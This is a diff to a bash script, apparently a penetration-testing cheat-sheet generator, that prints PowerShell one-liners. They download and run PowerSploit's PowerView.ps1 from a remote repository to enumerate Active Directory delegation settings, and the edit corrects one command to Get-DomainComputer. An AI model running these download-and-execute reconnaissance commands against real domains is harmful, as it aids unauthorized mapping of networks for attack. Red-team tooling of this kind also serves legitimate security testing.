@@ -851,7 +851,7 @@ echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComput
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -TrustedToAuth"
 echo -e ""
 echo -e "${IBLUE}Delegation (Unconstrained)${RESTORE}"
-echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -Unconstrained | select -ExpandProperty name"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -Unconstrained | select -ExpandProperty name"
 echo -e ""
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
